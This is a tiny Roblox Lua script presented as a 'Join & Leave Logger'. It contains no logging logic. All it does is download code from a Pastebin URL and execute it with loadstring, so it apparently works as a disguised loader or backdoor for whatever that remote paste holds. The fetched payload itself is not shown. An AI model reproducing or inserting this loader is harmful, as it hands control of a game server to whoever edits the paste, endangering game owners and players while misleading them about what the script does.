local premsg = "JAVA | Join & Leave Logger: "
local Http = game:GetService("HttpService")

local scrpt = Http:GetAsync("https://pastebin.com/raw/D8QCAsF7")
local success, errorMessage = pcall(loadstring(scrpt))
if not success then
	warn(premsg, errorMessage)
end
